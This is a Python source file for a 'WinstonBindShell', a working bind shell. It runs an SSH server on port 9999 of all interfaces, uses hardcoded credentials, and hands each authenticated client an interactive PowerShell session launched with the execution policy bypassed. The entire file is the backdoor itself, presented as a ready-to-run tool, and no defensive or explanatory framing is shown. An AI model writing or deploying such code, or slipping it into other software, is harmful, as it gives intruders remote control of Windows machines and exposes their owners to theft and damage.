import socket
import subprocess
import threading
import sys
import paramiko

class MySSHHandler(paramiko.ServerInterface):
    def __init__(self, user, pwd):
        self.user = user
        self.pwd = pwd

    def check_auth_password(self, username, password):
        if username == self.user and password == self.pwd:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY

    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        return True

    def check_channel_shell_request(self, channel):
        return True
    

class WinstonBindShell:
    def __init__(self, host='0.0.0.0', port=9999):
        # basic create
        self.host_key = paramiko.RSAKey.generate(2048)
        self.host = host
        self.port = port
        self.username = "windows-bind-shell"
        self.password = "windows-bind-shell"
        
        # create socket server
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    

    def _forward_out(self, source_pipe, target_socket):
        try:
            while True:
                data = source_pipe.read(1024)
                if not data:
                    break
                target_socket.sendall(data)
        except:
            pass

    def _forward_in(self, source_socket, target_pipe):
        try:
            while True:
                data = source_socket.recv(1024)
                if not data:
                    break
                target_pipe.write(data)
                target_pipe.flush()
        except:
            pass

    def handle_client(self, client, addr):
        proc = None
        try:
            transport = paramiko.Transport(client)
            transport.add_server_key(self.host_key)

            server_handler = MySSHHandler(self.username, self.password)
            transport.start_server(server=server_handler)

            chan = transport.accept(20)
            if chan is None:
                print(f"[-] {addr[0]} Auth failed or channel timeout.")
                return
            
            print(f"[+] Encrypted connection established from: {addr[0]}")

            proc = subprocess.Popen(
                ["powershell.exe", "-NoLogo", "-NoExit", "-ExecutionPolicy", "Bypass"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=False,
                bufsize=0
            )
            print(f"[+] Connection received from IP: {addr[0]}")
    

            # 3. create a thread
            t1 = threading.Thread(target=self._forward_out, args=(proc.stdout, chan))
            t2 = threading.Thread(target=self._forward_out, args=(proc.stderr, chan))
            t3 = threading.Thread(target=self._forward_in, args=(chan, proc.stdin))

            for t in [t1, t2, t3]:
                t.daemon = True
                t.start()

            proc.wait()

        except Exception as e:
            print(f"[-] Execution error: {e}")
        finally:
            print(f"[*] cleaning up connection for {addr[0]}")
            if proc and proc.poll() is None:
                proc.terminate()
            try:
                if 'transport' in locals() and transport:
                    transport.close()
            except:
                pass

    def start(self):
        try:
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            print(f"[+] Successful bind port {self.port}")
            print("[+] Waiting for connections...")

            while True:
                client, addr = self.server.accept()
                # create a thread for every execution
                client_thread = threading.Thread(
                    target=self.handle_client, 
                    args=(client, addr)
                )
                client_thread.daemon = True
                client_thread.start()
                print(f"[*] Created execution thread for {addr[0]}")

        except KeyboardInterrupt:
            print("\n[*] Server shutting down...")
        except Exception as e:
            print(f"[-] Server error: {e}")
        finally:
            self.server.close()

if __name__ == "__main__":
    shell = WinstonBindShell(port=9999)
    shell.start()


    